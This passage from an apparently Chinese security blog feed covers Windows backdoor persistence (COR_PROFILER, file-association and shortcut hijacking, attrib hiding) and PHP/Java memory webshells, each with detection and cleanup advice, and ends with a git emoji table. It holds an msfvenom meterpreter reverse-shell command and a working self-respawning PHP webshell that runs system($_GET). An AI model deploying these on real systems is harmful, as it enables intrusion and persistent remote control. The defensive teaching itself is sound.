bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=444 -f dll &gt; test.dll       32位<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourip LPORT=444 -f dll &gt; test.dll   64位<br></code></pre></td></tr></table></figure><p>将后门放入目标主机<code>C:\Windows\System32\test.dll</code></p><p>设置目标系统环境变量（需要管理员权限，<strong>要注册为全局变量，不然只能在当前cmd窗口劫持.net程序</strong>）：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">SETX COR_ENABLE_PROFILING <span class="hljs-number">1</span> /M   <br>SETX COR_PROFILER &#123;GGUUGGUU-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-AABBCCDDEEFF&#125; /M<br></code></pre></td></tr></table></figure><p>随后目标主机执行powershell之类的.net程序即可触发后门</p><h4 id="检测-6"><a href="#检测-6" class="headerlink" title="检测"></a>检测</h4><ol><li><p>检查环境变量COR_ENABLE_PROFILING和COR_PROFILER</p></li><li><p>检查注册表键值<code>HKEY_CURRENT_USER\Software\Classes\CLSID</code>中有无可疑项</p></li></ol><h3 id="office后门"><a href="#office后门" class="headerlink" title="office后门"></a>office后门</h3><p>参考：<a href="https://github.com/3gstudent/Office-Persistence/">https://github.com/3gstudent/Office-Persistence/</a></p><h3 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h3><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。<br>举个例子来说，位图文件（BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。</p><p>我们可以用<code>assoc</code>命令显示或修改文件扩展名关联，用<code>ftype</code>命令显示或修改用在文件扩展名关联中的文件类型：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">&gt;<span class="hljs-built_in">assoc</span> .txt<br>.txt=txtfile<br><br>&gt;<span class="hljs-built_in">ftype</span> txtfile<br>txtfile=<span class="hljs-variable">%SystemRoot%</span>\system32\NOTEPAD.EXE %<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>相关的注册表：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">HKEY_CURRENT_USER\Software\Classe    <span class="hljs-regexp">//</span>保存了当前用户的类注册和文件扩展名信息<br>HKEY_LOCAL_MACHINE\Software\Classe   <span class="hljs-regexp">//</span>保存了系统所有用户用户的类注册和文件扩展名信息<br>HKEY_CLASS_ROOT                      <span class="hljs-regexp">//</span>HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图<br></code></pre></td></tr></table></figure><h4 id="留后门-17"><a href="#留后门-17" class="headerlink" title="留后门"></a>留后门</h4><p>以<code>.txt</code>为例，通过文件关联来修改它默认打开的程序。<br>修改<code>\HKEY_CLASS_ROOT\txtfile\shell\open\command</code>的默认值为我们要执行的程序，将<code>%SystemRoot%\system32\NOTEPAD.EXE %1</code>修改为<code>%SystemRoot%\system32\calc.exe %1</code></p><p>打开txt文件即可弹出计算器</p><h4 id="检测-7"><a href="#检测-7" class="headerlink" title="检测"></a>检测</h4><p>检查注册表项文件扩展名关联程序有无异常，或者使用ftype和assoc检查常见的文件关联有无异常</p><h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><h4 id="留后门-18"><a href="#留后门-18" class="headerlink" title="留后门"></a>留后门</h4><p>举个远程桌面快捷方式的例子，将目标处的%windir%\system32\mstsc.exe替换为%windir%\system32\cmd.exe &#x2F;c calc.exe&amp;mstsc.exe，用户点击快捷方式时即可触发cmd的执行</p><h4 id="检测-8"><a href="#检测-8" class="headerlink" title="检测"></a>检测</h4><p>检查快捷方式的目标是否有可疑的使用&amp;连接的多个程序的执行</p><h3 id="attrib隐藏文件"><a href="#attrib隐藏文件" class="headerlink" title="attrib隐藏文件"></a>attrib隐藏文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">attrib <br>\+ 设置属性。<br>\- 清除属性。<br><span class="hljs-built_in">R</span> 只读文件属性。<br>A 存档文件属性。<br>S 系统文件属性。<br><span class="hljs-built_in">H</span> 隐藏文件属性。<br>I 无内容索引文件属性。<br>X 无清理文件属性。<br>V 完整性属性<br>attrib +s +a +<span class="hljs-built_in">h</span> +<span class="hljs-built_in">r</span> <span class="hljs-number">1</span>.txt 增加系统文件属性、只读文件属性等即使查看隐藏文件也看不见<br></code></pre></td></tr></table></figure><p>使用dir &#x2F;a可以查看到隐藏的文件</p>]]></content>
    
    
    
    <tags>
      
      <tag>backdoor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存马（memshell）利用与检测</title>
    <link href="/blog/2023/09/16/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88memshell%EF%BC%89%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A3%80%E6%B5%8B/"/>
    <url>/blog/2023/09/16/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88memshell%EF%BC%89%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<p>内存马是无文件攻击的一种常用手段，随着攻防演练热度越来越高流量分析、EDR等专业安全设备被蓝方广泛使用，传统文件上传的webshell或以文件形式驻留的后门越来越容易被检测到，因此内存马使用越来越多。内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度。</p><p><img src="/images/fj67.jpg"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>客户端发起Web请求后，中间件的各个独立组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马就是利用请求过程中在内存中修改已有的组件或动态注册一个新的组件，插入shellcode，达到持久化控制服务器的目的。攻击者利用软件安全漏洞，构造恶意输入导致软件正在处理输入数据时出现非预期的错误，将输入数据写入内存中的某些特定敏感位置，从而劫持软件控制流、执行流，转而执行外部输入的指令代码，造成目标系统被获取远程控制。</p><h3 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h3><p>PHP内存马即PHP不死马，会无限在指定目录中生成webshell文件：</p><p><code>不死马.php -&gt; 上传到server -&gt; 执行不死马.php -&gt; 循环生成一句话木马 </code></p><p>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @system($_GET[&quot;log&quot;]); ?&gt;&#x27;</span>;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;log.php&quot;</span>))&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;log.php&quot;</span>, <span class="hljs-variable">$content</span>);<br>    &#125;<br>  <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol><li><code>ignore_user_abort(1);</code> 该函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</li><li><code>set_time_limit(0);</code> 函数限制脚本的执行时间(如设置5则需在5秒内执行完)。这里设置为0是指没有时间限制。</li><li><code>unlink(__FILE__);</code>删除文件本身</li></ol><p>免杀：字符串拼接、旋转、加密解密、自定义函数、异或操作、生成隐藏文件</p><h3 id="Java内存马"><a href="#Java内存马" class="headerlink" title="Java内存马"></a>Java内存马</h3><p>Java内存马的流程：</p><ul><li>第一步，获取当前请求的HttpRequest对象或tomcat的StandardContext对象(Weblogic下是ServletContext对象)，SpringMVC和SpringBoot下注入controller和interceptor则是获取到WebApplicationContext对象。</li><li>第二步，创建servlet、filter或controller等恶意对象</li><li>第三步，使用各类context对象的各种方法，向中间件或框架动态添加servlet、filter或controller等恶意对象，完成内存马的注入</li></ul><p>向各种中间件和框架注入内存马的基础，就是要获得context，所谓context实际上就是拥有当前中间件或框架处理请求、保存和控制servlet对象、保存和控制filter对象等功能的对象。</p><h4 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h4><p><strong>已有request对象情况下</strong>：从request对象可以获取servletContext再一步一步获取standardContext。例如可以向Tomcat的webapp目录下上传JSP文件的情况下，JSP文件里可以就直接调用request对象，因为Tomcat编码JSP文件为java文件时，会自动将request对象放加进去。这时只需要一步一步获取standardContext即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.servlet.<span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <span class="hljs-comment">// 获取属性</span><br>appctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);  <span class="hljs-comment">//从servletContext中获取context属性-&gt;applicationContext</span><br><br><span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <span class="hljs-comment">// 获取属性</span><br>stdctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);  <span class="hljs-comment">// 从applicationContext中获取context属性-&gt;standardContext，applicationContext构造时需要传入standardContext</span><br></code></pre></td></tr></table></figure><p><strong>没有Context的情况下：</strong></p><ol><li>由于Tomcat（仅限8和9版本）处理请求的线程中，存在ContextLoader对象，而这个对象又保存了StandardContext对象，所以很方便就获取了，代码如下：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.catalina.loader.<span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br><br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();<br><br>System.out.println(standardContext);<br></code></pre></td></tr></table></figure><ol start="2"><li>从ThreadLoacl获取request，详见<a href="https://xz.aliyun.com/t/7388">threedr3am</a>师傅的文章，支持Tomcat 7、8、9</li><li>从MBean中获取StandardContext对象，必须猜中项目名和host，才能获取到对应的standardContext对象，支持Tomcat 7、8、9，具体内容如<a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g">奇安信</a>团队的研究</li></ol><h2 id="检测与防护"><a href="#检测与防护" class="headerlink" title="检测与防护"></a>检测与防护</h2><h3 id="PHP内存马-1"><a href="#PHP内存马-1" class="headerlink" title="PHP内存马"></a>PHP内存马</h3><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>通过对PHP进程执行行为进行监控，关联分析敏感行为以识别此类攻击，检查所有PHP进程处理请求的持续时间。</p><h4 id="查杀"><a href="#查杀" class="headerlink" title="查杀"></a>查杀</h4><ol><li>重启服务</li><li>占用目录和文件名，与不死马生成的马的名字一样的路径及文件</li><li>一直定时删除不死马文件</li></ol><h3 id="Java内存马-1"><a href="#Java内存马-1" class="headerlink" title="Java内存马"></a>Java内存马</h3><h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><p><strong>扫描Filter和Servlet：</strong>要想扫描web应用内存中的Filter和Servlet，我们必须知道它们存储的位置。通过查看代码，我们知道StandardContext对象中维护如下属性：1. 和Filter相关的是<code>filterDefs</code>和<code>filterMaps</code>两个属性。这两个属性分别维护着全局Filter的定义，以及Filter的映射关系。2. 和Servlet相关的是<code>children</code>和<code>servletMappings</code>两个属性。这两个属性分别维护这全家Servlet的定义，以及Servlet的映射关系。request对象中存储着StandardContext对象：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">request.getSession().getServletContext() &#123;ApplicationContextFacade&#125;<br>  -&gt; context &#123;ApplicationContext&#125; <br>    -&gt; context &#123;StandardContext&#125;<br><span class="hljs-comment">      * filterDefs</span><br><span class="hljs-comment">      * filterMaps</span><br><span class="hljs-comment">      * children</span><br><span class="hljs-comment">      * servletMappings</span><br></code></pre></td></tr></table></figure><p>所以我们只需要通过反射遍历request，最终就可以拿到Filter和Servlet的如下信息：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Filter</span>/Servlet名<br>匹配路径<br><span class="hljs-keyword">Class</span>名<br>ClassLoader<br><span class="hljs-keyword">Class</span>文件存储路径。<br>内存中<span class="hljs-keyword">Class</span>字节码（方便反编译审计其是否存在恶意代码）<br>该<span class="hljs-keyword">Class</span>是否有对应的磁盘文件（判断内存马的重要指标）<br></code></pre></td></tr></table></figure><h4 id="清除"><a href="#清除" class="headerlink" title="清除"></a>清除</h4><p><strong>注销Filter内存马：</strong>Tomcat注销filter其实就是将该Filter从全局filterDefs和filterMaps中清除掉。具体的操作分别如下<code>removeFilterDef</code>和<code>removeFilterMap</code>两个方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//org.apache.catalina.core.StandardContext#removeFilterDef</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeFilterDef</span><span class="hljs-params">(FilterDef filterDef)</span> &#123;<br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.filterDefs) &#123;<br>        <span class="hljs-built_in">this</span>.filterDefs.remove(filterDef.getFilterName());<br>    &#125;<br>    <span class="hljs-built_in">this</span>.fireContainerEvent(<span class="hljs-string">&quot;removeFilterDef&quot;</span>, filterDef);<br>&#125;<br><br><span class="hljs-comment">//org.apache.catalina.core.StandardContext#removeFilterMap</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeFilterMap</span><span class="hljs-params">(FilterMap filterMap)</span> &#123;<br>    <span class="hljs-built_in">this</span>.filterMaps.remove(filterMap);<br>    <span class="hljs-built_in">this</span>.fireContainerEvent(<span class="hljs-string">&quot;removeFilterMap&quot;</span>, filterMap);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过反射调用即可注销：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteFilter</span><span class="hljs-params">(HttpServletRequest request,String filterName)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> getStandardContext(request);<br>    <br>    <span class="hljs-comment">// org.apache.catalina.core.StandardContext#removeFilterDef</span><br>    HashMap&lt;String,Object&gt; filterConfig = getFilterConfig(request);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">appFilterConfig</span> <span class="hljs-operator">=</span> filterConfig.get(filterName);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">_filterDef</span> <span class="hljs-operator">=</span> appFilterConfig.getClass().getDeclaredField(<span class="hljs-string">&quot;filterDef&quot;</span>);<br>    _filterDef.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> _filterDef.get(appFilterConfig);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">removeFilterDef</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="hljs-string">&quot;removeFilterDef&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;org.apache.tomcat.util.descriptor.web.FilterDef.class&#125;);<br>    removeFilterDef.setAccessible(<span class="hljs-literal">true</span>);<br>    removeFilterDef.invoke(standardContext,filterDef);<br>    <br>    <span class="hljs-comment">// org.apache.catalina.core.StandardContext#removeFilterMap</span><br>    Object[] filterMaps = getFilterMaps(request);<br>    <span class="hljs-keyword">for</span>(Object filterMap:filterMaps)&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_filterName</span> <span class="hljs-operator">=</span> filterMap.getClass().getDeclaredField(<span class="hljs-string">&quot;filterName&quot;</span>);<br>        _filterName.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterName0</span> <span class="hljs-operator">=</span> (String)_filterName.get(filterMap);<br>        <span class="hljs-keyword">if</span>(filterName0.equals(filterName))&#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">removeFilterMap</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="hljs-string">&quot;removeFilterMap&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;org.apache.catalina.deploy.FilterMap.class&#125;);<br>            removeFilterDef.setAccessible(<span class="hljs-literal">true</span>);<br>            removeFilterMap.invoke(standardContext,filterMap);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注销Servlet内存马：</strong>注销Servlet的原理也是类似，将该Servlet从全局servletMappings和children中清除掉即可。在Tomcat源码中对应的是<code>removeServletMapping</code>和<code>removeChild</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//org.apache.catalina.core.StandardContext#removeServletMapping</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeServletMapping</span><span class="hljs-params">(String pattern)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.servletMappingsLock) &#123;<br>        name = (String)<span class="hljs-built_in">this</span>.servletMappings.remove(pattern);<br>    &#125;<br><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper)<span class="hljs-built_in">this</span>.findChild(name);<br>    <span class="hljs-keyword">if</span> (wrapper != <span class="hljs-literal">null</span>) &#123;<br>        wrapper.removeMapping(pattern);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.fireContainerEvent(<span class="hljs-string">&quot;removeServletMapping&quot;</span>, pattern);<br>&#125;<br><br><span class="hljs-comment">//org.apache.catalina.core.StandardContext#removeChild</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeChild</span><span class="hljs-params">(Container child)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!(child <span class="hljs-keyword">instanceof</span> Wrapper)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<span class="hljs-string">&quot;standardContext.notWrapper&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">super</span>.removeChild(child);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反射调用移除：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteServlet</span><span class="hljs-params">(HttpServletRequest request,String servletName)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    HashMap&lt;String,Object&gt; childs = getChildren(request);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">objChild</span> <span class="hljs-operator">=</span> childs.get(servletName);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">urlPattern</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    HashMap&lt;String,String&gt; servletMaps = getServletMaps(request);<br>    <span class="hljs-keyword">for</span>(Map.Entry&lt;String,String&gt; servletMap:servletMaps.entrySet())&#123;<br>        <span class="hljs-keyword">if</span>(servletMap.getValue().equals(servletName))&#123;<br>            urlPattern = servletMap.getKey();<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(urlPattern != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 反射调用 org.apache.catalina.core.StandardContext#removeServletMapping</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> getStandardContext(request);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">removeServletMapping</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="hljs-string">&quot;removeServletMapping&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;);<br>        removeServletMapping.setAccessible(<span class="hljs-literal">true</span>);<br>        removeServletMapping.invoke(standardContext, urlPattern);<br>        <span class="hljs-comment">// Tomcat 6必须removeChild 789可以不用</span><br>        <span class="hljs-comment">// 反射调用 org.apache.catalina.core.StandardContext#removeChild</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">removeChild</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="hljs-string">&quot;removeChild&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;org.apache.catalina.Container.class&#125;);<br>        removeChild.setAccessible(<span class="hljs-literal">true</span>);<br>        removeChild.invoke(standardContext, objChild);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git emoji的使用</title>
    <link href="/blog/2023/06/15/git-emoji%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2023/06/15/git-emoji%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>执行 <code>git commit</code> 时使用 emoji 为本次提交打上一个 “标识”, 使得此次 commit 的主要工作得以凸现，也能够使得其在整个提交历史中易于区分与查找。</strong></p><span id="more"></span><table><thead><tr><th align="left">Commit type</th><th align="left">Emoji</th></tr></thead><tbody><tr><td align="left">首次提交</td><td align="left">:tada: <code>:tada:</code></td></tr><tr><td align="left">版本标签</td><td align="left">:bookmark: <code>:bookmark:</code></td></tr><tr><td align="left">引入新功能</td><td align="left">:sparkles: <code>:sparkles:</code></td></tr><tr><td align="left">修复bug</td><td align="left">:bug: <code>:bug:</code></td></tr><tr><td align="left">元数据</td><td align="left">:card_index: <code>:card_index:</code></td></tr><tr><td align="left">文档</td><td align="left">:books: <code>:books:</code></td></tr><tr><td align="left">编写源代码</td><td align="left">:bulb: <code>:bulb:</code></td></tr><tr><td align="left">提升性能</td><td align="left">:racehorse: <code>:racehorse:</code></td></tr><tr><td align="left">更新UI和样式文件</td><td align="left">:lipstick: <code>:lipstick:</code></td></tr><tr><td align="left">Tests</td><td align="left">:rotating_light: <code>:rotating_light:</code></td></tr><tr><td align="left">增加测试</td><td align="left">:white_check_mark: <code>:white_check_mark:</code></td></tr><tr><td align="left">通过测试</td><td align="left">:heavy_check_mark: <code>:heavy_check_mark:</code></td></tr><tr><td align="left">一般更新</td><td align="left">:zap: <code>:zap:</code></td></tr><tr><td align="left">改进代码格式&#x2F;结构</td><td align="left">:art: <code>:art:</code></td></tr><tr><td align="left">重构代码</td><td align="left">:hammer: <code>:hammer:</code></td></tr><tr><td align="left">移除代码&#x2F;文件</td><td align="left">:fire: <code>:fire:</code></td></tr><tr><td align="left">持续集成CI</td><td align="left">:green_heart: <code>:green_heart:</code></td></tr><tr><td align="left">修复安全问题</td><td align="left">:lock: <code>:lock:</code></td></tr><tr><td align="left">升级依赖</td><td align="left">:arrow_up: <code>:arrow_up:</code></td></tr><tr><td align="left">降级依赖</td><td align="left">:arrow_down: <code>:arrow_down:</code></td></tr><tr><td align="left">去除代码中可能存在问题</td><td align="left">:shirt: <code>:shirt:</code></td></tr><tr><td align="left">翻译</td><td align="left">:alien: <code>:alien:</code></td></tr><tr><td align="left">文本</td><td align="left">:pencil: <code>:pencil:</code></td></tr><tr><td align="left">重要补丁</td><td align="left">:ambulance: <code>:ambulance:</code></td></tr><tr><td align="left">部署功能</td><td align="left">:rocket: <code>:rocket:</code></td></tr><tr><td align="left">修复MacOS下的问题</td><td align="left">:apple: <code>:apple:</code></td></tr><tr><td align="left">修复Linux下的问题</td><td align="left">:penguin: <code>:penguin:</code></td></tr><tr><td align="left">修复Windows下的问题</td><td align="left">:checkered_flag: <code>:checkered_flag:</code></td></tr><tr><td align="left">工作进行中</td><td align="left">:construction:  <code>:construction:</code></td></tr><tr><td align="left">添加持续集成CI构建系统</td><td align="left">:construction_worker: <code>:construction_worker:</code></td></tr><tr><td align="left">添加分析或跟踪代码</td><td align="left">:chart_with_upwards_trend: <code>:chart_with_upwards_trend:</code></td></tr><tr><td align="left">移除一个依赖</td><td align="left">:heavy_minus_sign: <code>:heavy_minus_sign:</code></td></tr><tr><td align="left">增加一个依赖</td><td align="left">:heavy_plus_sign: <code>:heavy_plus_sign:</code></td></tr><tr><td align="left">Docker相关</td><td align="left">:whale: <code>:whale:</code></td></tr><tr><td align="left">修改配置文件</td><td align="left">:wrench: <code>:wrench:</code></td></tr><tr><td align="left">Package.json in JS</td><td 